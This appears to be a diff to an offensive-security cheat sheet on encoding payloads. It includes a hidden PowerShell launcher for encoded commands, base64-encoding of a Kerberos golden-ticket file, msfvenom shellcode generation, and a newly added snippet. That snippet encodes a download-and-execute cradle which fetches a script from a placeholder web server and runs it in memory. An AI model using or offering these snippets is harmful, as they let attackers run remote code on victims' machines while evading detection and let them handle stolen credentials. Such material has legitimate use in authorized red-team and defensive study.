@@ -241,7 +241,7 @@ Cat to base64
 	powershell -Sta -Nop -Window Hidden -EncodedCommand <encodedCommand>
 ```
 
-Powershell Convert to base64
+Powershell to base64
 
 ```cpp
 [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi")) 
@@ -255,8 +255,18 @@ Hex Encode
 	xxd -i encmeter.bin
 ```
 
+
+
 Default MSF bin
 
 ```
 	msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading worked!" -f raw > shellcode.bin
+```
+
+PS memory 
+
+```powershell
+	$string = "iex (New-Object Net.WebClient).DownloadString('http://<webServer>:8082/ps.ps1')"
+	$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
+	echo $encodedcommand
 ```
